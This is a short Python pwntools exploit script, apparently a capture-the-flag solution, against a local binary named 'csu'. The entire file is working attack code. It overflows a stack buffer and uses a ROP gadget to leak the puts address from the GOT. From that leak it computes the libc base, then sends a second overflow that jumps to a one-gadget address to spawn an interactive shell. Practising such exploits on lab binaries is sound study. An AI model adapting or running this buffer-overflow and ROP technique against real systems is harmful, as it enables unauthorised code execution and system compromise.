from pwn import *
p = process('./csu')
e = ELF('./csu')

prdi = 0x0000000000400703
prsir15 = 0x0000000000400701

p.recvuntil(b"Tell me what you want to say!!")

pay = b'a' * 0x20
pay += b'b' * 8
pay += p64(prdi)
pay += p64(e.got['puts'])
pay += p64(e.plt['puts'])
pay += p64(e.symbols['main'])

p.sendline(pay)
p.recv()
libc_base = u64(p.recv(6)+ b'\x00\x00') - 0x6f6a0
print(hex(libc_base))

one_shot = libc_base + 0xf1247

p.recvuntil(b"Tell me what you want to say!!")

pay = b'a' * 0x20
pay += b'b' * 8
pay += p64(one_shot)

p.sendline(pay)
p.interactive()